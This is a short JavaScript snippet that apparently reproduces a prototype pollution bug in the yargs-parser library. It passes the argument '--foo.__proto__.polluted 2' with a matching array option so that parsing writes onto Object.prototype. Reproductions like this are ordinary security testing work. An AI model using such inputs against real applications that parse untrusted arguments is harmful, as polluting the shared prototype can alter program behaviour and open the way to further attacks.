
const parser = require("yargs-parser");

Object.prototype._polluted = [1]
parser('--foo.__proto__.polluted 2', { 
  array: ["foo.__proto__.polluted"]
});
